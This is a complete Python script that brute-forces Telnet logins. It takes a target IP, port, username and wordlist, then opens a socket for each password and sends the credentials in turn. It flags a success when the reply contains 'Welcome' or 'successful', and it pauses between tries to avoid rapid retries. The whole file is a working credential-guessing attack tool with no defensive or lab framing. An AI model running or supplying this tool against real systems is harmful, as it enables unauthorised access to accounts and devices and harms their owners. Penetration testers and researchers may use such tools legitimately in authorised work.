import socket
import time
import re

# Function to get user input
def get_user_input():
    host = input("Please enter IP address: ")
    port = int(input("Please enter the port: "))
    username = input("Please enter the username: ")
    wordlist_file = input("Please enter the path to your wordlist file: ")
    return host, port, username, wordlist_file

# Function to load passwords from a wordlist using a generator
def load_wordlist(wordlist_file):
    try:
        with open(wordlist_file, 'r', encoding='ISO-8859-1') as file:
            for line in file:
                yield line.strip()  # Yield each password one by one
    except FileNotFoundError:
        print(f"Error: The file {wordlist_file} was not found.")
        return []
    except UnicodeDecodeError as e:
        print(f"Error decoding the wordlist file: {e}")
        return []

# Function to interact with the Telnet service using socket
def brute_force_login(host, port, username, wordlist_file):
    for password in load_wordlist(wordlist_file):  # Iterate directly over the generator
        print(f"Attempting with Username: {username} and Password: {password}")

        try:
            # Create a new socket for each attempt
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)  # Set timeout for the connection
                s.connect((host, port))

                # Send the username
                s.sendall(username.encode('utf-8') + b"\n")
                response = s.recv(1024).decode('utf-8', errors='ignore')
                
                # Check for a password prompt
                if "password" in response.lower():
                    # Send the password
                    s.sendall(password.encode('utf-8') + b"\n")
                else:
                    print("No password prompt received.")
                    continue

                # Receive the result after attempting login
                result = s.recv(1024).decode('utf-8', errors='ignore')

                # Check if login was successful by matching "Welcome" or "successful"
                if re.search(r"Welcome", result, re.IGNORECASE) or re.search(r"successful", result, re.IGNORECASE):
                    print(f"\033[1;33mSuccess! Login with Username: {username} and Password: {password}\033[0m")
                    return  # Exit after successful login
                else:
                    print(f"Failed login attempt with Username: {username} and Password: {password}")

        except socket.timeout:
            print("Connection timed out.")
        except Exception as e:
            print(f"Error: {e}")

        # Add a delay between attempts to avoid rapid retries
        time.sleep(1)

# Main logic
def main():
    # Get user input
    host, port, username, wordlist_file = get_user_input()

    # Run the brute force login function
    brute_force_login(host, port, username, wordlist_file)

# Call the main function to execute the script
if __name__ == "__main__":
    main()
